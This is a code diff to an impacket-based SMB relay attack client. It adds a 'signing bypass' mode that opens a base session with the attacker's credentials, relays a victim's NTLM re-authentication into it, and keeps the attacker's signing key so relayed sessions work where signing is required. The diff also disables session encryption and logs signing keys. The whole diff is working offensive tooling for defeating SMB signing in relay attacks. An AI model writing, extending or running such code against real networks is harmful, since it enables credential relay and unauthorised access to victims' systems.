@@ -39,8 +39,10 @@ from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Exte
 from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCARD, SMB2Negotiate_Response, \
     SMB2_NEGOTIATE, SMB2Negotiate, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30, SMB2_GLOBAL_CAP_LEASING, \
     SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
-    SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
-from impacket.smbconnection import SMBConnection, SMB_DIALECT
+    SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response, \
+    SMB2_NEGOTIATE_SIGNING_ENABLED, SMB2_SESSION_FLAG_ENCRYPT_DATA
+from impacket.smbconnection import SMBConnection, SMB_DIALECT, SessionError
+from impacket.nmb import NetBIOSError
 from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from impacket.dcerpc.v5.transport import SMBTransport
@@ -57,13 +59,17 @@ class MYSMB(SMB):
         return SMB.neg_session(self, extended_security=self.extendedSecurity, negPacket=negPacket)
 
 class MYSMB3(SMB3):
-    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None):
+    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None, allowSigning=False):
         self.extendedSecurity = extendedSecurity
+        self.allowSigning = allowSigning
         SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket), preferredDialect=preferredDialect)
 
     def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
-        # We DON'T want to sign
-        self._Connection['ClientSecurityMode'] = 0
+        # We DON'T want to sign, unless the signing bypass has to sign with a key of its own
+        if self.allowSigning is True:
+            self._Connection['ClientSecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED
+        else:
+            self._Connection['ClientSecurityMode'] = 0
 
         if self.RequireMessageSigning is True:
             LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
@@ -106,7 +112,7 @@ class MYSMB3(SMB3):
         self._Connection['ServerGuid']        = negResp['ServerGuid']
         self._Connection['GSSNegotiateToken'] = negResp['Buffer']
         self._Connection['Dialect']           = negResp['DialectRevision']
-        if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED:
+        if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED and self.allowSigning is False:
             LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
             return
         if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
@@ -292,8 +298,12 @@ class SMBRelayClient(ProtocolClient):
             if self.serverConfig.remove_target:
                 preferredDialect = SMB2_DIALECT_21
             smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
-                               negPacket=packet, preferredDialect=preferredDialect)
+                               negPacket=packet, preferredDialect=preferredDialect,
+                               allowSigning=self.serverConfig.reauth_bypass)
         else:
+            if self.serverConfig.reauth_bypass:
+                LOG.error('The SMB signing bypass needs SMB2 or later, but the target negotiated SMBv1')
+                return False
             # Answer is SMB packet, sticking to SMBv1
             smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
                               negPacket=packet)
@@ -301,10 +311,49 @@ class SMBRelayClient(ProtocolClient):
         self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort,
                                      existingConnection=smbClient, manualNegotiate=True)
 
+        if self.serverConfig.reauth_bypass:
+            return self.openBaseSession()
+
+        return True
+
+    def openBaseSession(self):
+        # Base session whose key the relayed re-authentication keeps instead of deriving a new one (MS-SMB2 3.3.5.5.2)
+        v2client = self.session.getSMBServer()
+        # the server only hands out a signing key to a session that asked for signing
+        v2client._Connection['RequireSigning'] = True
+        try:
+            self.session.login(self.serverConfig.reauth_user, self.serverConfig.reauth_password,
+                               self.serverConfig.reauth_domain, self.serverConfig.reauth_lmhash,
+                               self.serverConfig.reauth_nthash)
+        except (SessionError, NetBIOSError, socketerror) as e:
+            LOG.error('SMB signing bypass: could not log in as %s\\%s: %s' % (self.serverConfig.reauth_domain,
+                                                                             self.serverConfig.reauth_user, e))
+            self.killConnection()
+            return False
+
+        if v2client._Session['SigningActivated'] is False:
+            LOG.error('SMB signing bypass: the target did not activate signing on our session, aborting')
+            self.killConnection()
+            return False
+
+        # impacket encrypts as soon as the dialect allows it, which would hide the signed re-authentication
+        v2client._Session['SessionFlags'] &= ~SMB2_SESSION_FLAG_ENCRYPT_DATA
+        LOG.info('SMB signing bypass: base session opened as %s\\%s' % (self.serverConfig.reauth_domain,
+                                                                         self.serverConfig.reauth_user))
+        LOG.debug('SMB signing bypass: session id 0x%x, signing key %s' % (
+            v2client._Session['SessionID'],
+            hexlify(v2client._Session['SigningKey'] or v2client._Session['SessionKey']).decode('utf-8')))
+
         return True
 
     def setUid(self,uid):
         self._uid = uid
+
+    def sessionSetupSecurityMode(self):
+        # a session setup asking for no signing at all would undo the signing bypass
+        if self.serverConfig.reauth_bypass:
+            return SMB2_NEGOTIATE_SIGNING_ENABLED
+        return 0
 
     def sendNegotiate(self, negotiateMessage):
         negoMessage = NTLMAuthNegotiate()
@@ -351,6 +400,7 @@ class SMBRelayClient(ProtocolClient):
 
         sessionSetup = SMB2SessionSetup()
         sessionSetup['Flags'] = 0
+        sessionSetup['SecurityMode'] = self.sessionSetupSecurityMode()
 
         sessionSetup['SecurityBufferLength'] = len(negotiateMessage)
         sessionSetup['Buffer'] = negotiateMessage
@@ -362,6 +412,9 @@ class SMBRelayClient(ProtocolClient):
         packetID = v2client.sendSMB(packet)
         ans = v2client.recvSMB(packetID)
         if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
+            if self.serverConfig.reauth_bypass and ans['SessionID'] != v2client._Session['SessionID']:
+                raise Exception('SMB signing bypass: the target opened a new session instead of '
+                                're-authenticating ours, it keeps no signing key to borrow')
             v2client._Session['SessionID'] = ans['SessionID']
             sessionSetupResponse = SMB2SessionSetup_Response(ans['Data'])
             return sessionSetupResponse['Buffer']
@@ -539,6 +592,13 @@ class SMBRelayClient(ProtocolClient):
             logging.info("Enabling session signing")
             self.session._SMBConnection.set_session_key(signingKey)
 
+        if self.serverConfig.reauth_bypass:
+            if errorCode == STATUS_SUCCESS:
+                LOG.info('SMB signing bypass: re-authentication accepted, the session keeps our signing key')
+            elif errorCode == STATUS_ACCESS_DENIED:
+                LOG.error('SMB signing bypass: re-authentication refused, the target enforces the same identity '
+                          'on re-authentication')
+
         return token, errorCode
 
     def sendAuthv2(self, authenticateMessageBlob, serverChallenge=None):
@@ -553,6 +613,7 @@ class SMBRelayClient(ProtocolClient):
 
         sessionSetup = SMB2SessionSetup()
         sessionSetup['Flags'] = 0
+        sessionSetup['SecurityMode'] = self.sessionSetupSecurityMode()
 
         packet = v2client.SMB_PACKET()
         packet['Command'] = SMB2_SESSION_SETUP
